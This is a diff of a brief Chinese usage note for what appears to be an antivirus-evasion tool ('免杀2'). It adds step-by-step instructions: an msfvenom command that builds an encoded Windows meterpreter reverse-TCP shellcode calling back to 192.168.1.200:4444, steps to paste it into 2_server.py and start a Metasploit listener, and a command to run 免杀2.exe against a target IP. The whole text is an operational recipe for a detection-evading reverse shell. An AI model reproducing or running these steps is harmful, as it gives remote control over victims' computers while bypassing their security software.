@@ -1,2 +1,8 @@
-免杀2使用：
-免杀2.exe ip_of_attack
+0x01:
+msfvenom -p  windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b '\x00' lhost=192.168.1.200 lport=4444  -f c
+0x02:
+复制生成的shellcode到2_server.py的shellcode变量中
+0x03:
+msf监听4444端口
+0x04:
+免杀2使用： 免杀2.exe [目标ip]
